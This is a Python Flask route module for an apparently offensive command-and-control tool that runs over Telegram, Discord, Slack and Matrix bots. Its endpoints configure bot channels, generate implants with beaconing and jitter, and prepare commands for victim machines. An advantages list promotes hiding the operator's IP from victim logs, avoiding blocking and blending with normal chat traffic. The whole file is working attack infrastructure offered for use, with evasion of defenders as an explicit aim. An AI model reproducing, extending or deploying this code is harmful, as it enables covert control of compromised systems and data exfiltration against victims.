"""
Telegram/Discord Bot C2 Flask Routes
PRO Module - Exotic Exfiltration
"""

from flask import Blueprint, render_template, request, jsonify
import secrets

bp = Blueprint('telegram_c2', __name__, url_prefix='/telegram-c2')

# Import the Bot C2 module
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from telegram_c2 import (
        SocialMediaC2, BotPlatform, BotConfig, 
        TelegramC2, DiscordC2, get_social_c2
    )
except ImportError:
    SocialMediaC2 = None
    BotPlatform = None
    BotConfig = None


@bp.route('/')
def index():
    """Telegram/Discord C2 main page"""
    platforms = []
    if BotPlatform:
        platforms = [
            {"name": p.name, "value": p.value}
            for p in BotPlatform
        ]
    return render_template('telegram_c2.html', platforms=platforms)


@bp.route('/api/configure', methods=['POST'])
def configure_bot():
    """Configure bot C2 channel"""
    try:
        data = request.get_json() or {}
        platform = data.get('platform', 'TELEGRAM')
        bot_token = data.get('bot_token', '')
        chat_id = data.get('chat_id', '')
        webhook_url = data.get('webhook_url', '')
        
        c2 = get_social_c2()
        
        # Set encryption key
        key = secrets.token_bytes(32)
        c2.set_encryption_key(key)
        
        if platform == 'TELEGRAM':
            if bot_token and chat_id:
                c2.configure_telegram(bot_token, chat_id)
                return jsonify({
                    "success": True,
                    "platform": "telegram",
                    "message": "Telegram bot configured",
                    "note": "Traffic will go through api.telegram.org"
                })
        elif platform == 'DISCORD':
            if webhook_url or (bot_token and chat_id):
                c2.configure_discord(
                    bot_token=bot_token if bot_token else None,
                    webhook_url=webhook_url if webhook_url else None,
                    channel_id=chat_id if chat_id else None
                )
                return jsonify({
                    "success": True,
                    "platform": "discord",
                    "message": "Discord configured",
                    "note": "Traffic will go through discord.com"
                })
        
        return jsonify({
            "success": False,
            "error": "Missing required configuration parameters"
        }), 400
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/generate-implant', methods=['POST'])
def generate_implant():
    """Generate bot C2 implant code"""
    try:
        data = request.get_json() or {}
        platform = data.get('platform', 'TELEGRAM')
        bot_token = data.get('bot_token', '1234567890:EXAMPLE_TOKEN')
        chat_id = data.get('chat_id', '-1001234567890')
        webhook_url = data.get('webhook_url', '')
        language = data.get('language', 'python')
        beacon_interval = data.get('beacon_interval', 60)
        jitter = data.get('jitter', 30)
        
        # Create config
        bot_platform = BotPlatform.TELEGRAM
        if BotPlatform:
            try:
                bot_platform = BotPlatform[platform]
            except KeyError:
                pass
        
        config = BotConfig(
            platform=bot_platform,
            bot_token=bot_token,
            chat_id=webhook_url if webhook_url else chat_id,
            encryption_key=secrets.token_bytes(32),
            beacon_interval=beacon_interval,
            jitter=jitter
        )
        
        c2 = get_social_c2()
        implant_code = c2.generate_implant_code(config, language)
        
        return jsonify({
            "success": True,
            "language": language,
            "platform": platform,
            "code": implant_code,
            "note": f"Traffic hidden through {platform.lower()} servers"
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/send-command', methods=['POST'])
def send_command():
    """Send command through bot channel (demo)"""
    try:
        data = request.get_json() or {}
        command = data.get('command', 'whoami')
        args = data.get('args', {})
        
        # In demo mode, just format the command
        cmd_format = {
            "cmd": command,
            "args": args,
            "encrypted": True,
            "note": "In production, this would be sent through the configured bot"
        }
        
        return jsonify({
            "success": True,
            "command": cmd_format,
            "message": "Command prepared for sending"
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/statistics')
def get_statistics():
    """Get bot C2 statistics"""
    try:
        c2 = get_social_c2()
        stats = c2.get_statistics()
        return jsonify({"success": True, "statistics": stats})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/platforms')
def list_platforms():
    """List supported platforms"""
    platforms = []
    if BotPlatform:
        platforms = [
            {
                "name": p.name,
                "value": p.value,
                "description": {
                    "TELEGRAM": "Telegram Bot API - Most popular",
                    "DISCORD": "Discord Bot/Webhook - Gaming cover",
                    "SLACK": "Slack Webhook - Corporate blend",
                    "MATRIX": "Matrix protocol - Decentralized"
                }.get(p.name, p.value)
            }
            for p in BotPlatform
        ]
    return jsonify({"success": True, "platforms": platforms})


@bp.route('/api/advantages')
def list_advantages():
    """List advantages of social media C2"""
    advantages = [
        {
            "title": "IP Hidden",
            "description": "Your IP never appears in victim logs. Traffic goes to telegram.org/discord.com"
        },
        {
            "title": "No Infrastructure",
            "description": "No need for your own C2 server. Use platform's free infrastructure"
        },
        {
            "title": "Hard to Block",
            "description": "Organizations can't easily block telegram.org or discord.com"
        },
        {
            "title": "TLS by Default",
            "description": "All traffic encrypted with platform's TLS certificate"
        },
        {
            "title": "Mobile Control",
            "description": "Control your implants from your phone using normal chat apps"
        },
        {
            "title": "Blends In",
            "description": "Traffic looks identical to normal chat app usage"
        }
    ]
    return jsonify({"success": True, "advantages": advantages})
